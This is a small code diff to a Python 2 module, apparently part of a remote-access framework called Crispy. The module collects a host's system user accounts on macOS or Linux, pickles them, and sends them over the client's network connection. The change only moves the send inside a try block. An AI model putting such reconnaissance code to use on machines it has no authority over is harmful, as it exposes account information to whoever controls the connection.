@@ -40,13 +40,12 @@ class UsersModule(CrispyModule):
         info("Getting system users now...")
 
         if (self.is_compatible()):
-            if self.client.is_darwin():
-                data = cPickle.dumps(self.marshall_darwin(), -1)
-            elif self.client.is_linux():
-                data = cPickle.dumps(self.marshall_linux(), -1)
-            
             try:
-                self.client.conn.sendall(data)
+                if self.client.is_darwin():
+                    self.client.conn.sendall(cPickle.dumps(self.marshall_darwin(), -1))
+                elif self.client.is_linux():
+                    self.client.conn.sendall(cPickle.dumps(self.marshall_linux(), -1))
+            
                 print self.client.conn.recv(1024).rstrip()
             except Exception as e:
                 logger.error(e)
